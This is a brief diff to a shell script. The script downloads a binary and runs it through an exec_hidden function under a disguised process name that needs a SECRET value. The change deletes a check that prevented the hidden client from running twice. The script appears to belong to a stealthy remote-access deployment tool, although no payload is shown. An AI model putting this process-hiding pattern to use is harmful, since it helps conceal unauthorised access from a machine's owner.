@@ -240,13 +240,7 @@ download_binary() {
 	return 0
 }
 
-exec_hidden() {
-	# Check if client is already running to prevent double execution
-	if pgrep -f "${PROC_HIDDEN_NAME}" >/dev/null 2>&1; then
-		print_debug "Client already running with process name: ${PROC_HIDDEN_NAME}"
-		return 0
-	fi
-	
+exec_hidden() {	
 	# Validate required variables
 	if [[ -z "${SECRET}" ]]; then
 		print_error "Missing required SECRET environment variable"
